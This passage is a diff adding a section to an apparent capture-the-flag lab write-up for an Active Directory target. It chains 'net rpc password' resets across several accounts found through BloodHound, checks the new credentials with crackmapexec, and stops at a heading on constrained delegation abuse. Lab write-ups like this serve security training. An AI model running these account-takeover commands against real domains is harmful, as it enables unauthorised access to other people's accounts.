@@ -173,3 +173,29 @@ The picture below shows how we can use *Active Directory Users and Computers* on
 
 ## password resets
 
+Coming back to our attack, we start to reset the passwords of the users identified as being vulnerable in our bloodhound enumeration. This can be done from our attacking machine using the *net* command.
+
+`sudo net rpc password 'SHAWNA_BRAY' 'Password1' -U 'THM.corp'/'TABATHA_BRITT'%'<REDACTED>' -S 10.10.152.174`
+
+We can make sure that the password has been changed by using *crackmapexec*
+
+`sudo crackmapexec smb 10.10.152.174 -u 'SHAWNA_BRAY' -p 'Password1'`
+
+![reset1](/images/21.png)
+
+We now move to pwn CRUZ_HALL
+
+`sudo net rpc password 'CRUZ_HALL' 'Password2' -U 'THM.corp'/'SHAWNA_BRAY'%'Password1' -S 10.10.152.174`
+
+![reset2](/images/22.png)
+
+Next we pwn our main target DARLA_WINTERS
+
+`sudo net rpc password 'DARLA_WINTERS' 'Password3' -U 'THM.corp'/'CRUZ_HALL'%'Password2' -S 10.10.152.174`
+
+![reset3](/images/23.png)
+
+---
+
+## constrained delegation abuse
+
